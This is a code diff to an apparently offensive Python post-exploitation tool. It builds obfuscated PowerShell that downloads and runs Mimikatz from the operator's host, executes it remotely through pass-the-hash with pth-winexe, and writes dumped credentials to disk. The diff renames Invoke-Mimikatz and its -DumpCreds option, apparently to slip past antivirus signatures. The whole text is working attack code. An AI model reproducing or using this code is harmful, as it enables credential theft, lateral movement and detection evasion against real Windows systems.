@@ -431,7 +431,7 @@ def datadump(user, passw, host, path, os_version):
 					print colored("[+]Attempting to Run Mimikatz",'green')
 					fout=open('/tmp/mimi.ps1','w')
 					fout.write('Import-Module c:\\a\n')
-					fout.write('a -DumpCreds > c:\\mimi_creddump.txt\n')
+					fout.write('a -Dwmp > c:\\mimi_creddump.txt\n')
 					fout.write('exit\n')
 					fout.close() 
 					
@@ -537,9 +537,9 @@ def datadump(user, passw, host, path, os_version):
 								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
 						
 						#Prepare string
-						line = "iex ((New-Object System.Net.WebClient).DownloadString('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"Invoke-Mimikatz"+randint(1,50)*x+" -DumpCreds > c:\\creds.txt"
+						line = "iex ((New-Object System.Net.WebClient).DownloadString('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"castell"+randint(1,50)*x+" -Dwmp > c:\\creds.txt"
 					else:
-						line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"Invoke-Mimikatz"+randint(1,50)*x+" -DumpCreds > c:\\creds.txt"
+						line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"castell"+randint(1,50)*x+" -Dwmp > c:\\creds.txt"
 					
 					print colored("[+] Using: "+line,'yellow')
 					en = b64encode(line.encode('UTF-16LE'))
